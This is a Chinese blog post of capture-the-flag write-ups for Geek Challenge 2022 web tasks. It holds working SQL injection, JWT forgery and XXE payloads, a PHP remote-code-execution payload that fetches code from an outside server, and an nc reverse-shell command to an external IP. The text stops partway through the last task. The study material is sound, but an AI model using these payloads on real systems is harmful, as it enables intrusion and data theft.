



<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="welcome to my blog" href="https://hq185187.github.io/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="welcome to my blog" href="https://hq185187.github.io/atom.xml" />
<link rel="alternate" type="application/json" title="welcome to my blog" href="https://hq185187.github.io/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  
  <meta name="keywords" content="java,git,springcloud" />


<link rel="canonical" href="https://hq185187.github.io/2023/07/11/Greek%20Challenge2022/">



  <title>
Greek Challenge2022 |
不良人天藏星 = welcome to my blog = 不良人总舵</title>
<meta name="generator" content="Hexo 6.3.0"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">Greek Challenge2022
  </h1>
  
<div class="meta">
  <span class="item" title="创建时间：2023-07-11 22:46:30">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">发表于</span>
    <time itemprop="dateCreated datePublished" datetime="2023-07-11T22:46:30+08:00">2023-07-11</time>
  </span>
  <span class="item" title="本文字数">
    <span class="icon">
      <i class="ic i-pen"></i>
    </span>
    <span class="text">本文字数</span>
    <span>19k</span>
    <span class="text">字</span>
  </span>
  <span class="item" title="阅读时长">
    <span class="icon">
      <i class="ic i-clock"></i>
    </span>
    <span class="text">阅读时长</span>
    <span>17 分钟</span>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="切换导航栏">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">不良人天藏星</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
          <img src="/assets/1.webp">
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">首页</a></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
  <link itemprop="mainEntityOfPage" href="https://hq185187.github.io/2023/07/11/Greek%20Challenge2022/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="hq185187">
    <meta itemprop="description" content="不良人总舵, 不定时更新web安全相关知识">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="welcome to my blog">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <p>花了好多天时间把去年的极客题目复现了一遍，虽然大部分题目的 docker 环境出了问题，但还是以各种方法本地调试复现一下，也学到了很多东西</p>
<p>收获:</p>
<ol>
<li>postgresql 数据库查询，单引号的过滤以及系统函数 pg_read_file 和 pg_ls_dir</li>
<li><code>__halt_compiler();</code>  中断编译器执行</li>
<li>disable_function 的绕过</li>
<li>一些提权方法</li>
<li>php 弱类型绕过 (16 进制和科学计数法)</li>
<li>php 伪随机数漏洞</li>
<li>CSRF 学习</li>
</ol>
<h2 id="1babysql"><a class="markdownIt-Anchor" href="#1babysql">#</a> 1.babysql</h2>
<p>单引号被过滤，g=2 和 g=3-1 返回结果相同，是数字型</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 order by 3--+</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 order by 4--+</span><br></pre></td></tr></table></figure>
<p>没有返回结果说明字段为三</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select 1,2,3--+</span><br></pre></td></tr></table></figure>
<p>没有返回结果，看了 wp 才知道这是 PosgreSQL 数据库，不支持类型转换，推测 id 是 int 类型，uname 和 passwd 是 char 类型<br>
所以：查询语句改成这样:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,version(),version() --+</span><br></pre></td></tr></table></figure>
<p>PostgreSQL 14.5 (Ubuntu 14.5-0ubuntu0.22.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.2.0-19ubuntu1) 11.2.0, 64-bit<br>
 确定了数据库是 PostgreSQL</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">用万能密码:-1 or 1=1--+得到提示 SYC&#123;Fake_FLag_Real_IN_ffllaag_schema&#125;</span><br><span class="line">提示我们去ffllaag这个schema,查下schema的表:</span><br><span class="line">-1 union select 1,$$a$$,(tablename) FROM pg_tables WHERE schemaname IN ($$ffllaag$$) --+</span><br><span class="line">注意:</span><br><span class="line">单引号的绕过:</span><br><span class="line">1.chr(120)||chr(120)</span><br><span class="line">||是字符串连接操作符，chr(120)是小写字母x，所以它的结果是xx</span><br><span class="line">2.$$xx$$</span><br><span class="line">$$表示包含特殊字符的字符串字面值,$$xx$$如果xx有单引号则不需要转义</span><br><span class="line"></span><br><span class="line">pg_tables:是一个 PostgreSQL 系统目录表，用于存储数据库中所有表的信息</span><br></pre></td></tr></table></figure>
<p>得到 user 表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-1 union select * from ffllaag.user--+</span><br><span class="line">发现无法全部回显,筛选一下</span><br><span class="line">-1 union select * from ffllaag.user where uname=$$admin$$--+</span><br><span class="line">得到:</span><br><span class="line">SYC&#123;S@rry_Realflag_In_root_directory&#125;</span><br><span class="line">提示flag在根目录下</span><br></pre></td></tr></table></figure>
<p>查看当前用户:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,user,user --+</span><br></pre></td></tr></table></figure>
<p>发现是 postgres, 默认是 superuser, 可以使用 pg_ls_dir 和 pg_read_file 函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,$$a$$,pg_ls_dir($$/$$)--+</span><br></pre></td></tr></table></figure>
<p>发现不能全部回显出来，用 order by 试试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,$$a$$,pg_ls_dir($$/$$) order by 3--+</span><br></pre></td></tr></table></figure>
<p>发现文件名为 aflag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,$$aflag$$,pg_read_file($$/aflag,0,1000)--+</span><br></pre></td></tr></table></figure>
<p>得到 flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;1s_re@L_eaEASYsy_SQ&amp;&amp;L&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2cointowin"><a class="markdownIt-Anchor" href="#2cointowin">#</a> 2.cointowin</h2>
<p>此题考查原型链污染<br>
一共三步:<br>
 登录，relief,import 三个可控输入点<br>
登陆只能控制⼀个 username 变量，relief 可以控制⼀个数字，⽽ import 可以输⼊⼀个 json 字符串 三个点，username 可以为任意字符串，但在整个程序中并没有任何可以执⾏ username 的点，放弃 relief 可以控制获取的⾦币数，但是范围有限制，只能获取 100-200 之间的，并且只能在 coin 低于 100 时调⽤ relief，那么只剩下 import 这 ⼀个点 先测试任意添加属性，看是否会报错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;user&quot;:&quot;username&quot;,&quot;hashcode&quot;:&quot;b4a67a604f3e43582f929fc3aaea0141&quot;,&quot;coin&quot;:101,&quot;3333&quot;:3333&#125;</span><br></pre></td></tr></table></figure>
<p>将其 import 可以看到导⼊成功，但是修改 coin 或者 user 就会显⽰ nononono, you are cheating me，那么看来只对 user，coin 以及 hashcode 进⾏了校验，可以尝试获取加密的 key 以及算法，但这⾥明显不可以取，只能来看看导⼊任何新数据，试试原型链污染</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;user&quot;:&quot;username&quot;,&quot;hashcode&quot;:&quot;b4a67a604f3e43582f929fc3aaea0141&quot;,&quot;coin&quot;:101,&quot;__proto__&quot;:&#123;&quot;coin&quot;:400000&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>当前⽤户已经有了 coin 属性，会优先访问本地的 coin ⽽不是原型链的 coin，怎么解决？ 登出，并创建新的账户，在创建 coin 属性前（即访问 relief 前）访问 flag, 就可以得到 flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;finall_Answer_is_42&#125;</span><br></pre></td></tr></table></figure>
<h2 id="3easygame"><a class="markdownIt-Anchor" href="#3easygame">#</a> 3.easygame</h2>
<p>此题考点 jwt 伪造和 xxe 注入</p>
<p>先来到 /newUser, 页面回显  <code>创建失败，只能创建Syclover用户(传输userName和password)</code> <br>
 直接 post:userName=Syclover&amp;password=666</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNzd29yZCI6IjY2NiIsImlkIjoxLCJ1c2VyTmFtZSI6IlN5Y2xvdmVyIiwiZXhwIjoxNjg0MjkyOTY2LCJpYXQiOjE2ODQyOTExNjZ9.PI_RAajKUVcNkzK0Iqv-oEOrK3K1S-O-yOq9VAd69vw</span><br></pre></td></tr></table></figure>
<p>访问 /secure/admin<br>
 页面回显  <code>没有token！请传入authorization header里</code> <br>
传参:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNzd29yZCI6IjY2NiIsImlkIjoxLCJ1c2VyTmFtZSI6IlN5Y2xvdmVyIiwiZXhwIjoxNjg0MjkyOTY2LCJpYXQiOjE2ODQyOTExNjZ9.PI_RAajKUVcNkzK0Iqv-oEOrK3K1S-O-yOq9VAd69vw</span><br></pre></td></tr></table></figure>
<p>页面回显  <code>当前用户信息id=1,userName=Syclover,password=666 不是admin不能继续下一关哦</code> <br>
这里可能是 JWT 伪造<br>
利用网站  <code>https://jwt.io/</code>  来伪造 JWT 的 token<br>
 利用给的附件的字典和工具爆破出密钥，改下 userName 为 admin</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNzd29yZCI6IjY2NiIsImlkIjoxLCJ1c2VyTmFtZSI6ImFkbWluIiwiZXhwIjoxNjg0MjkyOTY2LCJpYXQiOjE2ODQyOTExNjZ9.OiTRoRkW_y9FCWB35vzJF90Y2uvWLx8qvW8FYB12JUE</span><br></pre></td></tr></table></figure>
<p>传参得到:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5LiL5LiA5YWz55u05o6l5Y67L1htbOeci+eci+acieayoeacieS9oOaDs+imgeeahOS4nOilv+WQpyEhIQ==</span><br></pre></td></tr></table></figure>
<p>base64 解码：下一关直接去 / Xml 看看有没有你想要的东西吧！！！<br>
 访问 / Xml<br>
 猜测是 XXE 漏洞:<br>
 改 post,Content-Type 为 application/xml</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;&lt;user&gt;&lt;firstname&gt; &amp;xxe;&lt;/firstname&gt;&lt;lastname&gt;Good!!!&lt;/lastname&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
<p>拿到 flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYc&#123;1_l0v3_th3_syc_fam1ly&#125;</span><br></pre></td></tr></table></figure>
<h2 id="4jsfind"><a class="markdownIt-Anchor" href="#4jsfind">#</a> 4.jsfind</h2>
<p>进去发现是个小游戏<br>
找找 js 文件中的敏感路径<br>
工具地址<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0dlcmJlbkphdmFkby9MaW5rRmluZGVy"> GerbenJavado/LinkFinder：一个在 JavaScript 文件中查找端点的 python 脚本 (github.com)</span></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">python linkfinder.py -i http://192.168.152.122:2204/ -d -o cli</span><br><span class="line"></span><br><span class="line">得到:</span><br><span class="line">js/wolf.js</span><br><span class="line">js/random.js</span><br><span class="line">js/angle.js</span><br><span class="line">js/math.js</span><br><span class="line">js/input.js</span><br><span class="line">js/sound.js</span><br><span class="line">js/menu.js</span><br><span class="line">js/file.js</span><br><span class="line">js/episodes.js</span><br><span class="line">js/maps.js</span><br><span class="line">js/game.js</span><br><span class="line">js/player.js</span><br><span class="line">js/sprites.js</span><br><span class="line">js/powerups.js</span><br><span class="line">js/ai.js</span><br><span class="line">js/actorai.js</span><br><span class="line">js/actors.js</span><br><span class="line">js/actstat.js</span><br><span class="line">js/weapon.js</span><br><span class="line">js/doors.js</span><br><span class="line">js/pushwall.js</span><br><span class="line">js/areas.js</span><br><span class="line">js/level.js</span><br><span class="line">js/raycaster.js</span><br><span class="line">js/renderer.js</span><br><span class="line">js/aaa/aaa/aaa/bbb/bbb/bbb/bbb/bbb/bbb/aaa/aaa/aaa/aaa/aaa/bbb/flag.js</span><br><span class="line">js/requestAnimFrame.js</span><br><span class="line">js/base64.js</span><br><span class="line">js/load.js</span><br><span class="line">art/paused.png</span><br><span class="line">art/getpsyched.png</span><br></pre></td></tr></table></figure>
<p>或者可以在 load.js 里看到被注释的 //    “js/aaa/aaa/aaa/bbb/bbb/bbb/bbb/bbb/bbb/aaa/aaa/aaa/aaa/aaa/bbb/flag.js”,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//   flag = U1lDPX5bXTtTWUM9e19fXzorK1NZQywkJCQkOighW10rIiIpW1NZQ10sX18kOisrU1lDLCRfJF86KCFbXSsiIilbU1lDXSxfJF86KytTWUMsJF8kJDooe30rIiIpW1NZQ10sJCRfJDooU1lDW1NZQ10rIiIpW1NZQ10sXyQkOisrU1lDLCQkJF86KCEiIisiIilbU1lDXSwkX186KytTWUMsJF8kOisrU1lDLCQkX186KHt9KyIiKVtTWUNdLCQkXzorK1NZQywkJCQ6KytTWUMsJF9fXzorK1NZQywkX18kOisrU1lDfTtTWUMuJF89KFNZQy4kXz1TWUMrIiIpW1NZQy4kXyRdKyhTWUMuXyQ9U1lDLiRfW1NZQy5fXyRdKSsoU1lDLiQkPShTWUMuJCsiIilbU1lDLl9fJF0pKygoIVNZQykrIiIpW1NZQy5fJCRdKyhTWUMuX189U1lDLiRfW1NZQy4kJF9dKSsoU1lDLiQ9KCEiIisiIilbU1lDLl9fJF0pKyhTWUMuXz0oISIiKyIiKVtTWUMuXyRfXSkrU1lDLiRfW1NZQy4kXyRdK1NZQy5fXytTWUMuXyQrU1lDLiQ7U1lDLiQkPVNZQy4kKyghIiIrIiIpW1NZQy5fJCRdK1NZQy5fXytTWUMuXytTWUMuJCtTWUMuJCQ7U1lDLiQ9KFNZQy5fX18pW1NZQy4kX11bU1lDLiRfXTtTWUMuJChTWUMuJChTWUMuJCQrIlwiIitTWUMuJF8kXysoIVtdKyIiKVtTWUMuXyRfXStTWUMuJCQkXysiXFwiK1NZQy5fXyQrU1lDLiQkXytTWUMuXyRfK1NZQy5fXysiKCdcXCIrU1lDLl9fJCtTWUMuXyRfK1NZQy5fJCQrIlxcIitTWUMuX18kK1NZQy5fJCQrU1lDLl9fJCsiXFwiK1NZQy5fXyQrU1lDLl9fXytTWUMuXyQkKyJ7XFwiK1NZQy5fXyQrU1lDLl9fXytTWUMuJF9fKyJAXFwiK1NZQy5fXyQrU1lDLiQkJCtTWUMuX18kK1NZQy5fX18rU1lDLl8rIl9cXCIrU1lDLl9fJCtTWUMuX18kK1NZQy4kX18rIlxcIitTWUMuX18kK1NZQy4kXyQrU1lDLl9fJCsiXFwiK1NZQy5fXyQrU1lDLl9fJCtTWUMuXyQkKyJcXCIrU1lDLl9fJCtTWUMuX18kK1NZQy5fJCQrU1lDLiQkJF8rIl9cXCIrU1lDLl9fJCtTWUMuX19fK1NZQy4kX18rU1lDLl8kJCtTWUMuJCRfXytTWUMuXyQrU1lDLiQkXyQrU1lDLiQkJF8rIl9cXCIrU1lDLl9fJCtTWUMuX19fK1NZQy4kXyQrIlxcIitTWUMuX18kK1NZQy4kXyQrU1lDLiQkXysiXFwiK1NZQy5fXyQrU1lDLl9fXytTWUMuXyQkK1NZQy5fJCtTWUMuJCRfJCsiXFwiK1NZQy5fXyQrU1lDLl9fXytTWUMuJF8kKyJ9Jyk7IisiXCIiKSgpKSgpOw==</span><br></pre></td></tr></table></figure>
<p>base64 解码之后:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC=~[];SYC=&#123;___:++SYC,$$$$:(![]+&quot;&quot;)[SYC],__$:++SYC,$_$_:(![]+&quot;&quot;)[SYC],_$_:++SYC,$_$$:(&#123;&#125;+&quot;&quot;)[SYC],$$_$:(SYC[SYC]+&quot;&quot;)[SYC],_$$:++SYC,$$$_:(!&quot;&quot;+&quot;&quot;)[SYC],$__:++SYC,$_$:++SYC,$$__:(&#123;&#125;+&quot;&quot;)[SYC],$$_:++SYC,$$$:++SYC,$___:++SYC,$__$:++SYC&#125;;SYC.$_=(SYC.$_=SYC+&quot;&quot;)[SYC.$_$]+(SYC._$=SYC.$_[SYC.__$])+(SYC.$$=(SYC.$+&quot;&quot;)[SYC.__$])+((!SYC)+&quot;&quot;)[SYC._$$]+(SYC.__=SYC.$_[SYC.$$_])+(SYC.$=(!&quot;&quot;+&quot;&quot;)[SYC.__$])+(SYC._=(!&quot;&quot;+&quot;&quot;)[SYC._$_])+SYC.$_[SYC.$_$]+SYC.__+SYC._$+SYC.$;SYC.$$=SYC.$+(!&quot;&quot;+&quot;&quot;)[SYC._$$]+SYC.__+SYC._+SYC.$+SYC.$$;SYC.$=(SYC.___)[SYC.$_][SYC.$_];SYC.$(SYC.$(SYC.$$+&quot;\&quot;&quot;+SYC.$_$_+(![]+&quot;&quot;)[SYC._$_]+SYC.$$$_+&quot;\\&quot;+SYC.__$+SYC.$$_+SYC._$_+SYC.__+&quot;(&#x27;\\&quot;+SYC.__$+SYC._$_+SYC._$$+&quot;\\&quot;+SYC.__$+SYC._$$+SYC.__$+&quot;\\&quot;+SYC.__$+SYC.___+SYC._$$+&quot;&#123;\\&quot;+SYC.__$+SYC.___+SYC.$__+&quot;@\\&quot;+SYC.__$+SYC.$$$+SYC.__$+SYC.___+SYC._+&quot;_\\&quot;+SYC.__$+SYC.__$+SYC.$__+&quot;\\&quot;+SYC.__$+SYC.$_$+SYC.__$+&quot;\\&quot;+SYC.__$+SYC.__$+SYC._$$+&quot;\\&quot;+SYC.__$+SYC.__$+SYC._$$+SYC.$$$_+&quot;_\\&quot;+SYC.__$+SYC.___+SYC.$__+SYC._$$+SYC.$$__+SYC._$+SYC.$$_$+SYC.$$$_+&quot;_\\&quot;+SYC.__$+SYC.___+SYC.$_$+&quot;\\&quot;+SYC.__$+SYC.$_$+SYC.$$_+&quot;\\&quot;+SYC.__$+SYC.___+SYC._$$+SYC._$+SYC.$$_$+&quot;\\&quot;+SYC.__$+SYC.___+SYC.$_$+&quot;&#125;&#x27;);&quot;+&quot;\&quot;&quot;)())();</span><br></pre></td></tr></table></figure>
<p>控制台输出一下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;D@y0u_LiKKe_D3code_EnCodE&#125;</span><br></pre></td></tr></table></figure>
<h2 id="5rceus"><a class="markdownIt-Anchor" href="#5rceus">#</a> 5.rceus</h2>
<p>考点:</p>
<ol>
<li><code>__halt_compiler();</code>  中断编译器执行</li>
<li>disable_function 的绕过</li>
<li>提权</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;syclover&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/;+/&#x27;</span>,<span class="string">&#x27;syclover&#x27;</span>,<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[A-Za-z_\(\)]+/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$code</span>)))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>.<span class="string">&#x27;syclover!&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>分析代码可以知道要想进入 eval 就要有分号；<br>
 而且 cmd 里只能有 <code>[A-Za-z_\(\)]</code>  这些字符，其他的单双引号或者 / 都会使结果不等于 syclover 从而无法进入 eval 函数<br>
进入之后要怎么绕过这个 eval 呢？</p>
<p><code>__halt_compiler();</code>  可以中断编译器的执行</p>
<p>执⾏命令后看 phpinfo，发现有 disalbe_function 需要绕过，常⻅的攻击⼀把梭不⾏，发现很关键的过滤了 fwrite, 于是修改脚本⾥的 fwrite 为 fputs。<br>
常规的绕过代码:<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21tMHIxL2V4cGxvaXRzL2Jsb2IvbWFzdGVyL3BocC1maWx0ZXItYnlwYXNzL2V4cGxvaXQucGhw">exploits/php-filter-bypass/exploit.php at master · mm0r1/exploits · GitHub</span><br>
 这里修改一下，绕过 disable_function，执⾏反弹 shell<br>
 需要提权，查看根⽬录 ，可以执⾏根⽬录⾥的 readsecret，发现需要交互，环境中没有 py，所以 script /dev/null, 反弹完整的 shell，执⾏后得到 secret，即 root 的密码，su 切换到 root，执⾏ /readflag<br>
 官方 payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd=eval(end(current(get_defined_vars())));__halt_compiler();&amp;s=file_put_contents(&#x27;/tmp/1&#x27;,file_get_contents(&#x27;http://vps:port/1.txt&#x27;)); ⽤于在本地存储php⽂件 </span><br><span class="line"></span><br><span class="line">?cmd=eval(end(current(get_defined_vars())));__halt_compiler();&amp;s=include(&#x27;/tmp/1&#x27;); 执⾏⽂件</span><br></pre></td></tr></table></figure>
<p>什么是 script /dev/null?<br>
 普通的反弹 shell 无法交互，我们可以这样:<br>
 监听端:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stty -echo raw; nc -lp 6663; stty sane</span><br></pre></td></tr></table></figure>
<p>目标方:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -c &#x27;/bin/bash -c &quot;script /dev/null&quot;&#x27; 123.60.42.113 6663</span><br></pre></td></tr></table></figure>
<p>此时就是完整的 shell</p>
<h2 id="6uploadrce"><a class="markdownIt-Anchor" href="#6uploadrce">#</a> 6.UploadRce</h2>
<p>通过备份文件信息泄露得到:<br>
.index.php.swp</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;option&#x27;</span>])) <span class="keyword">die</span>();</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;option&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$str</span> != <span class="literal">NULL</span>)&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;:Where is the source code of config.php?&#x27;</span>;</span><br><span class="line">   &#125;   </span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./config.php&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;|\$option=\&#x27;.*\&#x27;;|&#x27;</span>, <span class="string">&quot;\$option=&#x27;<span class="subst">$str</span>&#x27;;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./config.php&#x27;</span>, <span class="variable">$file</span>); </span><br></pre></td></tr></table></figure>
<p>.config.php.swp</p>
